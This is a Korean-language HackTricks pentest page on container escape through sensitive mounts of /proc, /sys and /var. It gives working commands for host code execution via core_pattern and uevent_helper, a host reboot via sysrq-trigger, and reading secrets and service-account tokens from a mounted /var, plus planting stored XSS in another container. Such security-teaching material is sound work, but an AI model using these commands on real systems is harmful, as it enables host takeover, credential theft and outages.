# Sensitive Mounts

{{#include ../../../../banners/hacktricks-training.md}}

`/proc`, `/sys`, 및 `/var`의 적절한 네임스페이스 격리 없이 노출되면 공격 표면 확대 및 정보 유출을 포함한 상당한 보안 위험이 발생합니다. 이러한 디렉토리는 민감한 파일을 포함하고 있으며, 잘못 구성되거나 무단 사용자가 접근할 경우 컨테이너 탈출, 호스트 수정 또는 추가 공격에 도움이 되는 정보를 제공할 수 있습니다. 예를 들어, `-v /proc:/host/proc`를 잘못 마운트하면 경로 기반 특성으로 인해 AppArmor 보호를 우회할 수 있으며, `/host/proc`가 보호되지 않게 됩니다.

**각 잠재적 취약점에 대한 추가 세부정보는** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**에서 확인할 수 있습니다.**

## procfs Vulnerabilities

### `/proc/sys`

이 디렉토리는 일반적으로 `sysctl(2)`를 통해 커널 변수를 수정할 수 있는 접근을 허용하며, 여러 개의 우려되는 하위 디렉토리를 포함합니다:

#### **`/proc/sys/kernel/core_pattern`**

- [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)에서 설명됨.
- 이 파일에 쓸 수 있다면, 파이프 `|` 뒤에 프로그램이나 스크립트의 경로를 작성하여 충돌이 발생한 후 실행되도록 할 수 있습니다.
- 공격자는 `mount`를 실행하여 호스트 내에서 자신의 컨테이너로의 경로를 찾고, 그 경로를 자신의 컨테이너 파일 시스템 내의 바이너리에 쓸 수 있습니다. 그런 다음 프로그램을 충돌시켜 커널이 컨테이너 외부에서 바이너리를 실행하도록 만들 수 있습니다.

- **테스트 및 악용 예시**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
이 게시물에서 더 많은 정보를 확인하세요: [this post](https://pwning.systems/posts/escaping-containers-for-fun/).

충돌하는 예제 프로그램:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세히 설명됨.
- 커널 모듈을 로드하기 위해 호출되는 커널 모듈 로더의 경로를 포함함.
- **접근 확인 예제**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe에 대한 접근 확인
```

#### **`/proc/sys/vm/panic_on_oom`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 참조됨.
- OOM 조건이 발생할 때 커널이 패닉을 일으키거나 OOM 킬러를 호출할지를 제어하는 전역 플래그.

#### **`/proc/sys/fs`**

- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에 따라 파일 시스템에 대한 옵션과 정보를 포함함.
- 쓰기 접근은 호스트에 대한 다양한 서비스 거부 공격을 가능하게 할 수 있음.

#### **`/proc/sys/fs/binfmt_misc`**

- 매직 넘버에 따라 비네이티브 이진 형식에 대한 인터프리터를 등록할 수 있음.
- `/proc/sys/fs/binfmt_misc/register`가 쓰기 가능할 경우 권한 상승 또는 루트 셸 접근으로 이어질 수 있음.
- 관련된 익스플로잇 및 설명:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- 심층 튜토리얼: [비디오 링크](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### `/proc`의 기타 항목

#### **`/proc/config.gz`**

- `CONFIG_IKCONFIG_PROC`가 활성화된 경우 커널 구성을 드러낼 수 있음.
- 공격자가 실행 중인 커널의 취약점을 식별하는 데 유용함.

#### **`/proc/sysrq-trigger`**

- Sysrq 명령을 호출할 수 있으며, 즉각적인 시스템 재부팅 또는 기타 중요한 작업을 유발할 수 있음.
- **호스트 재부팅 예제**:

```bash
echo b > /proc/sysrq-trigger # 호스트 재부팅
```

#### **`/proc/kmsg`**

- 커널 링 버퍼 메시지를 노출함.
- 커널 익스플로잇, 주소 유출 및 민감한 시스템 정보를 제공하는 데 도움이 될 수 있음.

#### **`/proc/kallsyms`**

- 커널에서 내보낸 심볼과 그 주소를 나열함.
- KASLR을 극복하기 위한 커널 익스플로잇 개발에 필수적임.
- 주소 정보는 `kptr_restrict`가 `1` 또는 `2`로 설정된 경우 제한됨.
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 자세히 설명됨.

#### **`/proc/[pid]/mem`**

- 커널 메모리 장치 `/dev/mem`와 인터페이스함.
- 역사적으로 권한 상승 공격에 취약함.
- [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)에서 더 많은 정보.

#### **`/proc/kcore`**

- 시스템의 물리적 메모리를 ELF 코어 형식으로 나타냄.
- 읽기는 호스트 시스템 및 다른 컨테이너의 메모리 내용을 유출할 수 있음.
- 큰 파일 크기는 읽기 문제나 소프트웨어 충돌을 초래할 수 있음.
- [2019년 /proc/kcore 덤프하기](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)에서 자세한 사용법.

#### **`/proc/kmem`**

- 커널 가상 메모리를 나타내는 `/dev/kmem`의 대체 인터페이스.
- 읽기 및 쓰기를 허용하여 커널 메모리를 직접 수정할 수 있음.

#### **`/proc/mem`**

- 물리적 메모리를 나타내는 `/dev/mem`의 대체 인터페이스.
- 읽기 및 쓰기를 허용하며, 모든 메모리 수정을 위해서는 가상 주소를 물리 주소로 변환해야 함.

#### **`/proc/sched_debug`**

- PID 네임스페이스 보호를 우회하여 프로세스 스케줄링 정보를 반환함.
- 프로세스 이름, ID 및 cgroup 식별자를 노출함.

#### **`/proc/[pid]/mountinfo`**

- 프로세스의 마운트 네임스페이스 내의 마운트 지점에 대한 정보를 제공함.
- 컨테이너 `rootfs` 또는 이미지의 위치를 노출함.

### `/sys` 취약점

#### **`/sys/kernel/uevent_helper`**

- 커널 장치 `uevents`를 처리하는 데 사용됨.
- `/sys/kernel/uevent_helper`에 쓰면 `uevent` 트리거 시 임의의 스크립트를 실행할 수 있음.
- **익스플로잇 예제**: %%%bash

#### 페이로드 생성

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### 컨테이너를 위한 OverlayFS 마운트에서 호스트 경로 찾기

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### 악성 헬퍼로 uevent_helper 설정

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### uevent 트리거

echo change > /sys/class/mem/null/uevent

#### 출력 읽기

cat /output %%%

#### **`/sys/class/thermal`**

- 온도 설정을 제어하며, 서비스 거부 공격이나 물리적 손상을 초래할 수 있음.

#### **`/sys/kernel/vmcoreinfo`**

- 커널 주소를 유출하여 KASLR을 손상시킬 수 있음.

#### **`/sys/kernel/security`**

- Linux 보안 모듈(AppArmor 등)의 구성을 허용하는 `securityfs` 인터페이스를 포함함.
- 접근이 가능하면 컨테이너가 자신의 MAC 시스템을 비활성화할 수 있음.

#### **`/sys/firmware/efi/vars` 및 `/sys/firmware/efi/efivars`**

- NVRAM에서 EFI 변수와 상호작용하기 위한 인터페이스를 노출함.
- 잘못된 구성이나 악용은 브릭된 노트북이나 부팅할 수 없는 호스트 머신으로 이어질 수 있음.

#### **`/sys/kernel/debug`**

- `debugfs`는 커널에 대한 "규칙 없음" 디버깅 인터페이스를 제공함.
- 제한 없는 특성으로 인해 보안 문제의 이력이 있음.

### `/var` 취약점

호스트의 **/var** 폴더는 컨테이너 런타임 소켓과 컨테이너의 파일 시스템을 포함함.
이 폴더가 컨테이너 내부에 마운트되면 해당 컨테이너는 다른 컨테이너의 파일 시스템에 루트 권한으로 읽기-쓰기 접근을 얻게 됨.
이는 컨테이너 간의 피벗, 서비스 거부를 유발하거나 다른 컨테이너 및 그 안에서 실행되는 애플리케이션에 백도어를 설치하는 데 악용될 수 있음.

#### Kubernetes

이와 같은 컨테이너가 Kubernetes로 배포되면:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
**pod-mounts-var-folder** 컨테이너 내부:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSS는 다음과 같이 달성되었습니다:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

컨테이너는 재시작이나 다른 작업이 필요하지 않다는 점에 유의하세요. 마운트된 **/var** 폴더를 통해 이루어진 모든 변경 사항은 즉시 적용됩니다.

구성 파일, 바이너리, 서비스, 애플리케이션 파일 및 셸 프로필을 교체하여 자동(또는 반자동) RCE를 달성할 수도 있습니다.

##### 클라우드 자격 증명에 대한 접근

컨테이너는 K8s 서비스 계정 토큰 또는 AWS 웹 아이덴티티 토큰을 읽을 수 있으며, 이를 통해 컨테이너는 K8s 또는 클라우드에 대한 무단 접근을 얻을 수 있습니다.
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Docker(또는 Docker Compose 배포)에서의 악용은 정확히 동일하지만, 일반적으로 다른 컨테이너의 파일 시스템은 다른 기본 경로 아래에서 사용할 수 있습니다:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
파일 시스템은 `/var/lib/docker/overlay2/` 아래에 있습니다:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### 주의

실제 경로는 서로 다른 설정에서 다를 수 있으므로, 다른 컨테이너의 파일 시스템과 SA / 웹 아이덴티티 토큰을 찾기 위해 **find** 명령어를 사용하는 것이 가장 좋습니다.



### 참고 문헌

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
